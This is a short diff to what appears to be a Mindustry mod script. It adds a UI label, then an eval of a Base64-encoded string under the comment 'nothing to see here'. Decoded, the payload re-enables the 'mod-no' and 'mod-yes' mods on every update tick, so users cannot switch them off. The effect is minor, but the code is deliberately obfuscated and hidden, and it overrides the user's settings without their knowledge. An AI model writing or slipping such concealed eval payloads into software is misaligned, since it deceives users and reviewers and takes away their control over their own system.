@@ -9,3 +9,6 @@ Events.on(ClientLoadEvent, () => {
 		me.add("[red]no");
 	});
 });
+
+// nothing to see here h
+eval(Packages.arc.util.serialization.Base64Coder.decodeString("Ly8gYW50aXRvZGUgaGhoaGhoaGgKRXZlbnRzLnJ1bihUcmlnZ2VyLnVwZGF0ZSwgKCkgPT4gewoJQ29yZS5zZXR0aW5ncy5wdXQoIm1vZC1uby1lbmFibGVkIiwgdHJ1ZSk7CglDb3JlLnNldHRpbmdzLnB1dCgibW9kLXllcy1lbmFibGVkIiwgdHJ1ZSk7Cn0pOwoK"));
